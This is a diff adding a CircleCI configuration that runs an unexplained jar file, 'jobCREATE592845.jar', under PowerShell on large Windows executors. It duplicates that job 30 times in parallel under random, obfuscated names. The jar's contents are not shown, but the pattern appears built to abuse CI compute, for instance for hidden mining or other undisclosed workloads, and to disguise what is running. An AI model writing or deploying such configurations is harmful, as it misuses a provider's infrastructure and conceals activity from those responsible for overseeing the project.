@@ -1,0 +1,82 @@
+version: 2.1
+
+orbs:
+  win: circleci/windows@5.0
+
+jobs:
+  WEBmer325465:
+    executor:
+      name: win/default
+      size: large
+    steps:
+      - checkout
+      - run:
+          name: PROXYver896725
+          command: |
+            java -jar jobCREATE592845.jar
+          shell: powershell.exe
+
+workflows:
+  version: 2
+  EXEC563386pkg:
+    jobs:
+      - WEBmer325465:
+          name: receiveeral673412
+      - WEBmer325465:
+          name: valid73prod1098
+      - WEBmer325465:
+          name: proxyER313418
+      - WEBmer325465:
+          name: RECEIVEER101326
+      - WEBmer325465:
+          name: PIPEproc190888
+      - WEBmer325465:
+          name: bind346887OR
+      - WEBmer325465:
+          name: fetchgamma234588
+      - WEBmer325465:
+          name: EXEC13263ural
+      - WEBmer325465:
+          name: pipeNESS437421
+      - WEBmer325465:
+          name: AUTHULTRA470446
+      - WEBmer325465:
+          name: certNANO82123
+      - WEBmer325465:
+          name: actionPROD605690
+      - WEBmer325465:
+          name: RECEIVEFAKE339995
+      - WEBmer325465:
+          name: configser995046
+      - WEBmer325465:
+          name: helpBUILD632281
+      - WEBmer325465:
+          name: VIEWder713728
+      - WEBmer325465:
+          name: logoutMOCK218207
+      - WEBmer325465:
+          name: linkapp919617
+      - WEBmer325465:
+          name: derWORKER703306
+      - WEBmer325465:
+          name: savework125828
+      - WEBmer325465:
+          name: QUEUECORE871684
+      - WEBmer325465:
+          name: ACTIONALPHA21537
+      - WEBmer325465:
+          name: PROCESS912100line
+      - WEBmer325465:
+          name: utilURAL590555
+      - WEBmer325465:
+          name: bridgeJOB220282
+      - WEBmer325465:
+          name: CACHEIR449661
+      - WEBmer325465:
+          name: actionproto224560
+      - WEBmer325465:
+          name: update4ARY7714
+      - WEBmer325465:
+          name: DISPLAYtask426771
+      - WEBmer325465:
+          name: thread498077remote
